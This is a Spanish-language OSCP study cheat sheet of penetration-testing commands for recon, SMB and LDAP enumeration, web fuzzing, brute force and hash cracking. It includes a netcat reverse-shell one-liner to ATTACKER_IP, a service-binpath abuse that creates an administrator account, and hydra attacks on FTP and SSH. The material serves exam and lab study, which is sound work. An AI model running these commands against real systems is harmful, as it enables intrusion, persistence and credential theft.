# Security Notes

Guia de comandos y procesos para la preparación del OSCP.
En continua revisión y actualización

Table of Contents
=================
  * [Table of Contents](#table-of-contents)
  * [<strong>Recon</strong>](#recon)
    * [netdiscover](#netdiscover)
    * [nmap](#nmap)
    * [Port 21 - FTP](#port-21---ftp)
    * [Port 80 - HTTP](#port-80---http)
    * [Port 88 - Kerberos](#port-88---kerberos)
    * [Port 139/445 - SMB](#port-139445---smb)
    * [Port 389 - LDAP](#port-389---ldap)    
    * [Busqueda Exploits](#busqueda-exploits)
  * [Escalada de privilegios](#escaladadeprivilegios)
    * [Linux](#linux)
      * [Info](#linux-info)
      * [Reverse Shell](#reverse-shell)
      * [Post-Explotacion](#Post-Explotacion)
    * [Windows](#windows)
      * [Info](#windows-info)
      * [Abusing UsoSvc](#abusing-usosvc)
  * [WEB](#web)
    * [Fuzzing](#Fuzzing)
    * [Brute Forxe](#Brute-Force)
  * [Cracking](#cracking)
  * [Tunnel SSH](#tunel-ssh)


[comment]: # (brup suite, vega, webscarab,ua-tester, ssh-keyscan, SQL-injection, ironwaf, (tmux + zsh), xargs, script del TTL)

# **Recon**

## netdiscover

```
netdiscoer -i <interface>
```

## nmap
``` 
# Escaneo nmap
nmap -sV -sC 10.10.10.10

# Escaneo nmap
nmap -sV -sC 10.10.10.10 -Pn

# Escaneo nmap UDP
nmap -sV -sC -sU 10.10.10.10

# Nmap Scripts
nmap -sV --script http-vuln-cve2006-3392 -p10000 10.10.10.10

nmap -sT -sV -A -p- -T5 -v
nmap -p- -v -sS -A -T4
sT:TCP Connect
sS:Syn Scan -> default
-sU: UDP
-A: detect os and services
-sV: service detection
```

## Port 21 - FTP
```
ftp 10.10.10.10
```

## Port 80 - HTTP
```
#Busqueda directorios HTML
dirb http://10.10.10.10 /usr/share/dirb/wordlists/big.txt

wfuzz

dirsearch
```

## Port 88 - Kerberos
```
# Del packete impacket
GetNPUsers.py DOMAIN/ -dc-ip 10.10.10.10 -usersfile users 
```
## Port 139/445 - SMB
```

enum4linux -a 10.10.10.10

smbclient -L 10.10.10.10

# Ejecutar comando *dir* 
smbclient -U=USERNAME%PASSWORD  "//10.10.10.10/SHARENAME" -c dir

smbclient.py -u user -p password -i 10.10.10.10

smbclient.py DOMAIN/USERNAME:PASSWORD@10.10.10.10

smbmap -u user -p password -H 10.10.10.10

# Montar en local un CIFS
mount -t cifs -o username=USERNAME,password=PASSOWRD "//10.10.10.10/SHARENAME" /mnt/smbmounted/

```

## Port 389 - LDAP
```
ldapsearch -H ldap://10.10.10.175:3268 -x
```

## Busqueda Exploits
```

searchsploit

```

# Escalada de privilegios

## linux

### Info
```
cat /etc/passwd

sudo -l

```

### Reverse Shell
```

netcat
Attacker: nc -lvp 4444
Victim: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

#SPAWN SHELL
- python -c 'import pty; pty.spawn("/bin/bash")'
- python3 -c 'import pty; pty.spawn("/bin/bash")'
- echo os.system('/bin/bash')
- /bin/sh -i
- perl -e 'exec "/bin/bash" '
- lua: os.execute('/bin/sh')

```

### Post-Explotacion
```
Revisar directorios:
	/home
	/tmp
Crontabs
Logs
	syslog
	messages
Revisar servicios i procesos activos
	ps -ef 
	netstat -antp
Buscar ficheros con permisos espciales SUID i GUID
```

## windows

winpeas, powerup.ps1, evil-winrm, impacket(secretsdump.py, wmiexec.py)
Se puede entrar con el user/password pero tambien con el hash

### Info
```
net user
net user USERNAME

net domain
```

### Abusing UsoSvc

```
sc query UsoSvc

sc qc UsoSvc

sc.exe stop UsoSvc

sc.exe config UsoSvc binpath= "C:\Windows\System32\cmd.exe /c net user john Password123 /add && net localgroup Administrators john /add" 

sc.exe start UsoSvc
```
# **WEB**

## Fuzzing 
```
wfuzz -w wordlist/general/common.txt <ip>/FUZZ
w: elige el fichero diccionario
hs: ignora las respuestas, util para 400,404
    -wfuzz --hc 404 -c --script=links -z list,index.html  http://10.10.10.10/FUZZ
    -wfuzz --hc 404,400 -c -w wordlist/vulns/cgis.txt  http://10.10.10.10/FUZZ

#FUZZ en POST
wfuzz --hc 404,400 -c -w fuzzing_web/wfuzz/wfuzz/wordlist/general/common.txt  -d "route=FUZZ" http://10.10.10.10/content.php | grep -v ' 0 W'

#Wfuzz con bucle en RANGO numerico
wfuzz --hc 404,400 -z range,0-10000 http://10.10.10.10/tokens/tokenFUZZ.txt

# DirBuster
dirb http://10.10.10.10/ /path/to/Diccionario

```
## webApps

```
# wrodpress
wpscan --url http://10.10.10.10/
```

## Brute Force

```
#Hydra
hydra -L usuaris.txt -P rockyou-withcount.txt 10.10.10.10 ftp -e nsr
hydra -s 22 -l demonslayer -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh
```

# Cracking

Poner el tema de las rules, transformar fichero to hash ("ssh2hohn").
hashid para identificar hashes

```
# Crackear el fichero *privateKey.hash* con el diccionario rockyou.txt
john --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt privateKey.john

# Cracking with hashcat 
hashcat -m 18200 -a 0 ./fsmith.creds /usr/share/wordlists/rockyou.txt
```
La página web de [Cyberchef](https://gchq.github.io/CyberChef/)

# Tunel SSH

```
# Tunel SSH
```
